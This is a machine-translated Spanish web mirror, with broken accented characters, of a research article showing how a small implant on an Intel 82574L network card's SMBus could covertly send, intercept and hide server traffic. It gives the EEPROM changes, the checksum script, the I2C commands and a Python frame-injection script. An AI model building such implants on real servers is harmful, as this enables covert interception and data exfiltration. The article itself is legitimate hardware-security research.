<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üëºüèø üë©‚Äçüé® üåö Fabricando su propio implante para electr√≥nica üéÖüèæ üßëüèΩ ‚ú≥Ô∏è</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="La historia de Bloomberg de que supuestamente se instalaron algunos implantes en las placas base [los chinos usaron un microchip para controlar las co...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Fabricando su propio implante para electr√≥nica</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/429190/"><img src="https://habrastorage.org/webt/0b/ft/fa/0bftfawizhuqj5ah4gu_9z1tzak.png"><br><br>  La historia de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Bloomberg de</a> que supuestamente se instalaron algunos implantes en las placas base [los <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">chinos usaron un microchip para controlar las computadoras estadounidenses</a> ] no pas√≥ desapercibida.  Despu√©s de eso, muchas personas compartieron ideas sobre la posibilidad de crear tales implantes (su tama√±o estimado, capacidades o m√©todo de detecci√≥n). <br><br>  Unos d√≠as despu√©s, la revista <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Bloomberg</a> public√≥ un art√≠culo con evidencia adicional.  Esto es lo que despert√≥ nuestro inter√©s espec√≠ficamente: <br><blockquote>  El servidor legal envi√≥ mensajes de una manera, el implante en la otra, pero parec√≠a que todo el tr√°fico proven√≠a de un servidor de confianza. </blockquote><br><a name="habracut"></a><br>  Hay formas de interactuar con la tarjeta de red directamente desde la placa base.  Varias personas indicaron que puede jugar con BMC (Baseboard Management Controller, un componente que permite el acceso al servidor adem√°s del canal principal), lo que permitir√° que el implante controle el BMC y obtenga acceso a la tarjeta de red.  Pero, ¬øc√≥mo funciona esto en la pr√°ctica?  Veamos si podemos reproducir esto. <br><br><h2>  Posici√≥n inicial </h2><br>  Veamos las posibles interfaces entre la NIC ( <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">tarjeta de red</a> ) y el BMC.  Uno de los principales protocolos para trabajar en un canal dedicado es la interfaz inteligente de administraci√≥n de la plataforma IPMI. <br><br><h3>  IPMI </h3><br>  Wikipedia dice que IPMI es "una interfaz de administraci√≥n de plataforma inteligente dise√±ada para monitorear y administrar de manera aut√≥noma las funciones que est√°n integradas directamente en el hardware y el firmware de las plataformas de servidor.  Las caracter√≠sticas clave de IPMI son el monitoreo, la restauraci√≥n de las funciones de administraci√≥n, el registro y el inventario, que est√°n disponibles independientemente del procesador, el BIOS y el sistema operativo.  Las funciones de administraci√≥n de la plataforma pueden estar disponibles incluso cuando el sistema est√° apagado ".  Muy similar a lo que necesitamos. <br><br>  El siguiente diagrama de flujo muestra una posible ruta de implementaci√≥n del proyecto: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/33c/3e3/2f6/33c3e32f69cf311114455fe1fb98d5a1.png"><br><br>  IPMI en realidad define dos canales de banda lateral para la NIC: SMBus y NC-SI.  NC-SI es un reemplazo de SMBus de √∫ltima generaci√≥n que admite velocidades de transferencia de datos mejoradas y otras caracter√≠sticas nuevas.  El problema es que ella necesita m√°s se√±ales (alrededor de 10), y es mucho m√°s dif√≠cil intervenir en su trabajo cuando estamos trabajando con un implante.  Entonces, por ahora, deteng√°monos en SMBus. <br><br><h3>  SMBus </h3><br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">SMBus</a> (System Management Bus) es un protocolo de comunicaci√≥n en serie para dispositivos de alimentaci√≥n.  Bus de dos hilos simple de un lado que proporciona comunicaciones sin complicaciones.  La mayor√≠a de las veces se usa en computadoras para conectar la placa base con una fuente de alimentaci√≥n y enviar instrucciones de encendido / apagado.  Basado en el bus <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">I <sup>2</sup> C</a> , com√∫nmente utilizado en microcontroladores.  La interfaz solo necesita dos se√±ales (frecuencia de reloj y datos), y la tercera se√±al es una interrupci√≥n.  Perfecto para el protocolo de juegos de implantes. <br><br><h2>  Primer contacto </h2><br>  Tienes que ser inteligente, no tener acceso a la placa base con BMC.  Al estudiar las caracter√≠sticas t√©cnicas de las placas base del servidor, descubrimos que algunas de ellas usan el chip <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Intel 82574L</a> .  Seg√∫n la <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">documentaci√≥n</a> , proporciona la "interfaz de transferencia avanzada SMBus", justo lo que necesita.  Y lo mejor de todo, viene en formato de tarjeta PCI-E. <br><br><h3>  Acceso SMBus </h3><br>  Fuimos a la tienda y ahora tenemos tarjetas <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Intel EXPI9301CTBLK</a> con el chip 82574L.  Que ahora <br><br>  La documentaci√≥n puede rastrear SMB_DAT y SMB_ALRT_N.  Afortunadamente, todos resultaron estar disponibles en las almohadillas de contacto.  Todo parece ser bastante f√°cil. <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e71/6a5/467/e716a54673d59b3aec0c9e34765ef734.jpg"><br>  <i>NIC PCB.</i>  <i>Arriba a la izquierda - EEPROM, arriba a la derecha - conector para SMBus [ALRT | CLK | DAT].</i>  <i>Tenga en cuenta que R39 y R40 est√°n sellados, lo que proh√≠be el acceso a SMBus para el conector PCIe.</i> <br><br>  Conectamos la <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">sonda I <sup>2</sup> C</a> y escaneamos el SMBus, pero no cont√°bamos nada √∫til.  La documentaci√≥n dice que SMBus solo est√° habilitado cuando se establece un registro de bits espec√≠fico.  Este valor se carga desde la EEPROM.  Es hora de cavar m√°s profundo. <br><br><h3>  Habilitar acceso a SMBus </h3><br>  La documentaci√≥n nos ayuda nuevamente.  El acceso a SMBus est√° determinado por el valor del registro cargado desde la EEPROM de la NIC.  Afortunadamente, EEPROM se puede leer con flashrom.  Al descargar el contenido de la EEPROM, podemos analizar y cambiar los valores: <br><br> <code>&gt; ./flashrom -p buspirate_spi:dev=/dev/hydrabus --read /tmp/flash.dump <br> flashrom p1.0-87-g9891b75-dirty on Linux 4.18.12-arch1-1-ARCH (x86_64) <br> flashrom is free software, get the source code at https://flashrom.org <br> <br> Using clock_gettime for delay loops (clk_id: 1, resolution: 1ns). <br> Found Winbond flash chip "W25X40" (512 kB, SPI) on buspirate_spi. <br> Reading flash... done.</code> <br> <br>  A juzgar por el mapa NVM (cap√≠tulo 6.1 de la documentaci√≥n), est√° claro que necesitamos cambiar dos valores: <br><br><ul><li>  Init Control Word 2 [MNGM] (Hoja de datos del cap√≠tulo 6.1.1.6) </li><li>  Compatibilidad [ASF SMBus Connected] (Hoja de datos, cap√≠tulo 6.1.2.1.1) </li><li>  Compatibilidad [SMBus Connected] (Hoja de datos, cap√≠tulo 6.1.2.1.1) </li></ul><br>  Solo es necesario tener en cuenta que en EEPROM los datos se almacenan en formato little endian. <br><br>  Despu√©s de eso, todav√≠a tenemos que lidiar con el valor de Checksum.  El Cap√≠tulo 6.1.2.11 establece que la suma de todas las palabras en el rango [0x00-0x40] debe ser 0xBABA.  Un poco de Python nos ayudar√° a calcular la suma de verificaci√≥n correcta: <br><br> <code>import struct <br> data = open('/tmp/flash.mod', 'rb').read() <br> tot = 0 <br> for i in range(0x3f): <br> tot = (tot + struct.unpack('&lt;H',data[2*i:(2*i)+2])[0]) &amp; 0xffff <br> <br> print("Checksum word must be : " + hex(0xbaba-tot)) <br> #Checksum word must be : 0x9efb</code> <br> <br>  Y finalmente, todos nuestros cambios para EEPROM: <br><br> <code>&lt; 00000000: 6805 ca89 b22e 2004 46f7 8010 ffff ffff h..... .F....... <br> &gt; 00000000: 6805 ca89 b22e 3014 46f7 8010 ffff ffff h.....0.F....... <br> &lt; 00000010: 69e4 0881 6b02 1fa0 8680 d310 ffff 5a9c i...k.........Z. <br> &gt; 00000010: 69e4 0881 6b02 1fa0 8680 d310 ffff 5adc i...k.........Z. <br> <br> &lt; 00000070: ffff ffff ffff ffff ffff 3001 ffff 0bef ..........0..... <br> &gt; 00000070: ffff ffff ffff ffff ffff 3001 ffff fb9e ..........0.....</code> <br> <br>  Despu√©s de hacer cambios y flashear la EEPROM, conectamos una sonda I <sup>2</sup> C y: <br><br> <code>i2c1&gt; scan <br> Device found at address 0x49 <br> i2c1&gt;</code> <br> <br>  La direcci√≥n I <sup>2</sup> C est√° codificada en siete bits, la direcci√≥n que necesitamos se obtiene como 0x49 &lt;&lt; 1 = 0x92. <br><br>  Ahora tenemos un diagrama de trabajo para nuestro implante.  Podemos enviar comandos a la NIC: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/13c/bfc/f14/13cbfcf14267b6055c8dc5760b59e2fd.jpg"><br><br><h2>  Recibiendo informaci√≥n </h2><br>  Como habr√°s adivinado, continuamos leyendo la documentaci√≥n y enviando comandos especialmente preparados a la NIC para verificar que todo funcionara como se esperaba. <br><br>  La documentaci√≥n describe todo lo que necesita saber sobre el formato de transacci√≥n en el cap√≠tulo 8.4.4.  La √∫nica diferencia es que no necesitamos calcular el PEC (suma de verificaci√≥n para SMBus, que se calcula para cada paquete).  Por ejemplo, podemos enviar el comando CMD a la direcci√≥n <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=" class="user_link">SLAVE</a> utilizando la siguiente secuencia: <br><br> <code>[START] [@SLAVE] [CMD] ( [START] [@SLAVE] [READ_DATA] ) [STOP]</code> <br> <br>  [START] y [STOP] son ‚Äã‚Äãlas condiciones START y STOP definidas por I <sup>2</sup> C. <br><br>  Por ejemplo, el comando para leer la direcci√≥n MAC (descrito en el cap√≠tulo 8.8.2.3) ser√° 0xD4.  Enviamos el comando a SMBus en modo I <sup>2</sup> C: <br><br> <code>[START] [0x92] [0xD4] [START] [0x92] [read 8 bytes] [STOP]</code> <br> <br>  Cuando se transfiere a los equipos Hydrabus, esto ser√°: <br><br> <code>i2c1&gt; [ 0x92 0xd4 [ 0x92 hd:2 hd:6 ] <br> I2C START <br> WRITE: 0x92 ACK 0xD4 ACK &lt;== [NIC address] [command] <br> I2C START &lt;== Switch state <br> WRITE: 0x92 ACK &lt;== [NIC address] <br> 07 D4 | .. &lt;== Read [length] [header] <br> 68 05 CA 89 B2 2E | h..... &lt;== Read MAC address bytes <br> NACK <br> I2C STOP</code> <br> <br>  Y s√≠, ¬°tenemos nuestra direcci√≥n MAC! <br><br><h2>  Hacer un implante </h2><br>  Ahora, sabiendo c√≥mo puede comunicarse con la NIC, veamos c√≥mo puede usar este canal para robar el tr√°fico de la red y enviar datos a trav√©s de la red.  El Cap√≠tulo 8 de la documentaci√≥n describe todo lo que necesita para hacer esto. <br><br><h3>  Enviando paquetes </h3><br>  Descrito en los cap√≠tulos 8.6 y 8.8.1.  Simplemente podemos crear una trama de Ethernet usando comandos.  Aqu√≠ hay un script de ejemplo para <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Hydrabus</a> o <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Bus Pirate</a> para enviar un paquete: <br><br> <code>import serial <br> import struct <br> from scapy.all import * <br> <br> ser = serial.Serial('/dev/ttyACM0',115200) <br> <br> def send_frame(pkt): <br> # Define the frame size <br> pktlen = struct.pack("B", len(pkt)) <br> <br> # Define the data length to be sent <br> fulllen = struct.pack("&gt;h", len(pkt)+3) <br> <br> # I2C write-then-read. Send frame + SMBus header, receive 0 <br> ser.write('\x08'+fulllen+'\x00\x00') <br> ser.write("\x92\xc4"+pktlen+pkt) <br> <br> # If packet has been sent successfully <br> if ser.read(1) == '\x01': <br> print "Send OK" <br> else: <br> print "Error sending" <br> ser.write('\x00') <br> ser.write('\x00') <br> ser.write('\x0F\n') <br> quit() <br> <br> # Open Hydrabus in binary mode <br> for i in xrange(20): <br> ser.write("\x00") <br> if "BBIO1" not in ser.read(5): <br> print "Could not get into binary mode" <br> quit() <br> <br> # Switch to I2C mode <br> ser.write('\x02') <br> if "I2C1" not in ser.read(4): <br> print "Cannot set I2C mode" <br> quit() <br> <br> #Create the frame to send <br> p = Ether(src="11:22:33:44:55:66", dst="ff:ff:ff:ff:ff:ff") / IP(src="10.31.32.82", dst="10.31.32.80")/ICMP() <br> <br> #Send the frame <br> send_frame(str(p)) <br> <br> # Return to main binary mode <br> ser.write('\x00') <br> #reset to console mode <br> ser.write('\x0F\n')</code> <br> <br>  Despu√©s de ejecutar el script, puede ver el paquete que viene de la m√°quina con el implante y, lo m√°s interesante, el servidor en s√≠ no ve este paquete en absoluto: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/ea1/947/4f2/ea19474f2a801afddb732624fa1f3d40.png"><br>  <i>Tcpdump de la m√°quina del atacante a la izquierda, servidor a la derecha</i> <br><br><h3>  Paquetes de lectura </h3><br><h4>  Filtrado </h4><br>  Para averiguar qu√© marcos deben ir a SMBus, la NIC utiliza filtros de control.  Mapean el tr√°fico de la red y lo redirigen a PCIe, a SMBus, o tanto all√≠ como all√≠.  Desde nuestro punto de vista, esto nos brinda una gran flexibilidad: <br><br><ul><li>  Puede rastrear el tr√°fico configurando un filtro que lo escanear√° y lo redirigir√° a PCIe y SMBus. </li><li>  Puede hacer desaparecer el tr√°fico dirigi√©ndolo solo a SMBus. </li><li>  Puede crear un canal oculto que no ser√° visible para el servidor con el implante. </li></ul><br>  Lo m√°s interesante es que el filtro se puede configurar para rastrear varios elementos del marco: <br><br><ul><li>  Puerto UDP / TCP </li><li>  VLAN </li><li>  IPv4 - IPv6 </li><li>  Direcci√≥n MAC </li><li>  ... </li></ul><br>  (Para una lista completa, vea el cap√≠tulo 8.4.2.1) <br><br>  Hay siete filtros MDEF independientes [0: 6] disponibles, y cada uno de ellos se puede configurar para redirigir el tr√°fico correspondiente a PCIe sobre SMBus utilizando el registro MANC2H (para m√°s detalles, consulte el cap√≠tulo 8.4.3). <br><br><h4>  Implementaci√≥n </h4><br>  Result√≥ ser bastante dif√≠cil configurar todo correctamente, probamos muchas combinaciones diferentes para que el filtro funcionara.  Afortunadamente, la <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">nota</a> sobre <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">la aplicaci√≥n de</a> Intel nos dio m√°s detalles sobre c√≥mo ejecutar los filtros de la manera que necesitamos. <br><br>  Usando nuestra sonda I <sup>2</sup> C, podemos configurar todo esto con cuatro comandos: <br><br> <code>//    <br> [ 0x92 0xca 0x01 0x40 ] <br> //  MDEF[0]   ,   UDP/664  UDP/623 <br> [ 0x92 0xcc 0x06 0x61 0x00 0x00 0x00 0x0c 0x00 ] <br> //  MANC2H      <br> [ 0x92 0xcc 0x05 0x0a 0x00 0x00 0x00 0x00 ] <br> //   (SMBus alerting, status reporting / Enable) <br> [ 0x92 0xca 0x01 0x45 ]</code> <br> <br>  Como se describe en el cap√≠tulo 8.8.1.3, es necesario establecer varios bits para permitir la recepci√≥n de datos y enviar marcos nuevamente a nuestro implante.  Elegimos la alerta SMBus porque otros modelos permiten que la tarjeta de red realice solicitudes as√≠ncronas a SMBus (para m√°s detalles, consulte el cap√≠tulo 8.4.5). <br><br><h4>  Marcos de lectura </h4><br>  Como utilizamos el m√©todo de alerta SMBus, ten√≠amos que esperar que la se√±al SMB_ALRT_N se apagara antes de enviar el comando Recibir paquete TCO.  Si esperamos demasiado, la NIC rechazar√° el paquete. <br><br>  Para ilustrar el diagrama, enviaremos marcos peri√≥dicamente y enviaremos comandos de lectura, solo para confirmar que este principio funciona.  El esquema se ve as√≠: <br><br><ul><li>  Un servidor con un implante tiene filtros que monitorean el tr√°fico con UDP / 623 (cap√≠tulo 3.6.1.2). </li><li>  El implante se simula con Hydrabus. </li><li>  Otro servidor env√≠a paquetes que caen bajo el filtro utilizando el script Scapy: </li></ul><br> <code>from scapy.all import * <br> p=Ether()/IP(dst="10.31.32.81")/UDP(dport=0x26f)/"MALICIOUS PAYLOAD" <br> while(1):sendp(p)</code> <br> <br>  Resulta algo interesante: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e03/407/a68/e03407a6872fbeda15ad73fa32c87257.png"><br><br>  A la izquierda, SMBus lee el cuadro; los datos del cuadro se muestran a continuaci√≥n.  A la derecha, tcpdump, que se ejecuta en un servidor con un implante, no muestra las tramas entrantes. <br><br><h4>  Frame Relay </h4><br>  Al cambiar el registro MANC2H, es posible asegurarse de que el tr√°fico que se env√≠a a SMBus y PCIe se muestre correctamente en el servidor.  Por ejemplo, creemos un filtro de intercepci√≥n que responda al tr√°fico UDP / 161 (SNMP) y lo env√≠e a SMBus y PCIe: <br><br> <code>//    <br> [ 0x92 0xca 0x01 0x40 ] <br> //  - 0   161 (0xa1) <br> [ 0x92 0xcc 0x04 0x63 0x00 0x00 0xa1 ] <br> //  MDEF[0]   ,   - 0 <br> [ 0x92 0xcc 0x06 0x61 0x00 0x00 0x00 0x10 0x00 ] <br> //  MANC2H     MDEF[0]  PCIe <br> [ 0x92 0xcc 0x05 0x0a 0x00 0x00 0x00 0x00 ] <br> //   (SMBus alerting, status reporting / Enable) <br> [ 0x92 0xca 0x01 0x45 ]</code> <br> <br>  Al habilitar los filtros, podemos enviar una solicitud SNMP al servidor con el implante y ver el paquete que intercept√≥ el implante.  Al mismo tiempo, el servidor responde a la solicitud, lo que significa que el paquete se redirigi√≥ correctamente a SMBus y PCIe: <br><br><img src="https://habrastorage.org/getpro/habr/post_images/e32/d3b/281/e32d3b281a556bd1bcdebe86498a2dc1.png"><br>  <i>Arriba hay una solicitud SNMP interceptada del implante.</i>  <i>A continuaci√≥n: la solicitud SNMP lleg√≥ al servidor.</i> <br><br><h2>  Conclusiones </h2><br>  Describimos un posible m√©todo para introducir un microcontrolador peque√±o y econ√≥mico como implante a nivel de NIC.  Tal implante necesita al menos cuatro contactos (Vcc, GND, CLK, DAT), y puede controlar la tarjeta del servidor.  Entre sus caracter√≠sticas: <br><br><ul><li>  Escuchando el tr√°fico de red entrante al servidor. </li><li>  Recibir comandos de la red sin el conocimiento del servidor. </li><li>  Transmisi√≥n de datos a trav√©s de la red sin el conocimiento del servidor. </li></ul><br>  En nuestro ejemplo, por simplicidad, Hydrabus se us√≥ como interfaz para I <sup>2</sup> C / SMBus, pero esto se puede hacer con la misma facilidad en un microcontrolador peque√±o, por ejemplo, ATtiny85 (es aproximadamente del tama√±o de una EEPROM para NIC). <br><br>  Sin embargo, en la vida real, el acceso a dicho implante ser√≠a solo para SMBus.  Dependiendo del esquema de la placa base, este dispositivo puede ser el √∫nico disponible, y luego la interacci√≥n con el sistema operativo del servidor ser√° imposible.  En el caso de que se requiera un control total sobre el sistema operativo, es mejor cambiar el c√≥digo BMC, ya que ya tiene acceso a todos los buses interesantes y no deja rastros visibles en la placa base. <br><br>  Otra desventaja de tal implante es que puede transmitir datos a velocidades del orden de 100 Kb / s, lo que no es suficiente para un estudio completo del tr√°fico.  Adem√°s, el implante puede interceptar solo el tr√°fico proveniente de la red.  Como resultado, esta soluci√≥n parece ineficaz en comparaci√≥n con los esfuerzos necesarios para su implementaci√≥n en el equipo objetivo. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/es429190/">https://habr.com/ru/post/es429190/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es429180/index.html">Ir a goto</a></li>
<li><a href="../es429182/index.html">La inteligencia artificial se top√≥ con una barrera de comprensi√≥n.</a></li>
<li><a href="../es429184/index.html">Los medios en l√≠nea previsiblemente rompen la cadena sobre los estudiosos de Oumuamua y Harvard</a></li>
<li><a href="../es429186/index.html">@Pythonetc Octubre 2018</a></li>
<li><a href="../es429188/index.html">Descripci√≥n general de PICASO 3D Designer XL</a></li>
<li><a href="../es429192/index.html">Estos nuevos trucos a√∫n son capaces de burlar a los videos de Deepfake.</a></li>
<li><a href="../es429194/index.html">7 bibliotecas para el desarrollo de Android en Kotlin</a></li>
<li><a href="../es429196/index.html">Exploraci√≥n m√≥vil iOS en tiempo de ejecuci√≥n con objeci√≥n, o piratear nuestra propia aplicaci√≥n</a></li>
<li><a href="../es429198/index.html">El marco Kernel-Bridge: Puente en anillo0</a></li>
<li><a href="../es429202/index.html">Cursos caros: ¬øvale la pena?</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>